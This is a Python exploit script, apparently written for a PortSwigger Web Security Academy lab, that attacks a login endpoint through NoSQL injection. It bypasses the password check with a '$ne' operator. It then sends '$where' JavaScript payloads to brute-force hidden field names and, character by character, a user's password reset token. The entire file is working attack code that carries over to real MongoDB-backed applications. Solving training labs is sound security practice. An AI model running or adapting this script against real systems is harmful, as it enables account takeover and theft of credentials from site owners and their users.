import requests
from string import ascii_letters, digits

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.LOGIN_ENDPOINT = '/login'
        self.USERNAME = 'carlos'
        self.PASSWORD = {
            '$ne': 'foobar'
        }
        self.CHARACTER_SET = ascii_letters + digits
        self.LAST_CHARACTER = self.CHARACTER_SET[-1]

    def extractFieldNames(self, fieldPosition):
        fieldName = str()
        while True:
            for character in self.CHARACTER_SET:
                payload = f'^{fieldName}{character}.*' if fieldName else f'^{character}.*'
                whereOperatorKey = f'Object.keys(this)[{fieldPosition}].match("{payload}")'
                print(f'[*] Sending payload: {whereOperatorKey}', end='\r')

                loginData = {
                    'username': self.USERNAME,
                    'password': self.PASSWORD,
                    '$where': whereOperatorKey
                }
                loginRespond = requests.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isEmptyFieldName = True if len(fieldName) == 0 else False
                isLastCharacter = character == self.LAST_CHARACTER

                if not isValidCharacter and isLastCharacter and isEmptyFieldName:
                    print(f'[-] Looped through all possible characters, no luck. This field position {fieldPosition} doesn\'t have a field?')
                    return
                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Field name: {fieldName}')
                    return
                if isValidCharacter:
                    fieldName += character
                    print(f'\n[+] Found valid character "{character}" on field position {fieldPosition}')
                    break

    def extractFieldData(self, fieldName):
        username = 'carlos'
        password = {
            '$ne': 'foobar'
        }
        characterIndex = 0
        foundResetToken = str()
        while True:
            for character in self.CHARACTER_SET:
                payload = f'this.pwResetTkn[{characterIndex}] == "{character}"'
                print(f'[*] Trying payload: {payload}', end='\r')
                loginData = {
                    'username': self.USERNAME,
                    'password': self.PASSWORD,
                    '$where': payload
                }
                loginRespond = requests.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isLastCharacter = character == self.LAST_CHARACTER

                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Password reset token: {foundResetToken}')
                    return
                if isValidCharacter:
                    foundResetToken += character
                    print(f'\n[+] Found valid character "{character}" on character position {characterIndex}')
                    characterIndex += 1
                    break

if __name__ == '__main__':
    baseUrl = 'https://0a01006d049033bb859262dd00ca001c.web-security-academy.net'
    exploit = Exploit(baseUrl)

    # you can change your minimum/maximum field position here
    # MINIMUM_FIELD_POSITION = 0
    # MAXIMUM_FIELD_POSITION = 4
    # for fieldPosition in range(MINIMUM_FIELD_POSITION, MAXIMUM_FIELD_POSITION):
    #     exploit.extractFieldNames(fieldPosition)

    FIELD_NAME = 'pwResetTkn'
    exploit.extractFieldData(FIELD_NAME)
